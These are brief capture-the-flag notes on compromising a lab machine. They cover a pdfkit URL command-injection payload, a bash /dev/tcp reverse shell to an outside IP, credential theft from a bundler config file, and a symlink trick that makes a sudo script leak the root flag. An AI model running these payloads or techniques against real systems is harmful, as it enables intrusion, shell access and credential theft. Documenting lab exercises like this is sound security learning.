T="10.129.80.224"

What able to get a response when passing:
url=http://`ls -al`
Noticed pdfkit and version

Googled and snyk came up: https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795

Confirmed command execution.
> **Note**
> The whole payload needed to be url encoded:
> http://%20`sleep 5`
> become:
> http%3a//%2520`sleep+5`

For reverse shell (same note about url encodig):
> http://%20`bash -c "bash -i >& /dev/tcp/10.10.14.70/9001 0>&1"`

Once in checked out `bundle config list`
Found username and password ~/.bundle/config, `su henry` with password, grabbed user flag.

Checked `sudo -l` noticed `/opt/update_dependancies.rb` is trying to read a `dependancies.yml`

Moved to director where henry had write access

Created `ln -s /root/root.txt dependancies.yml` re-ran and error message outputted the flag.
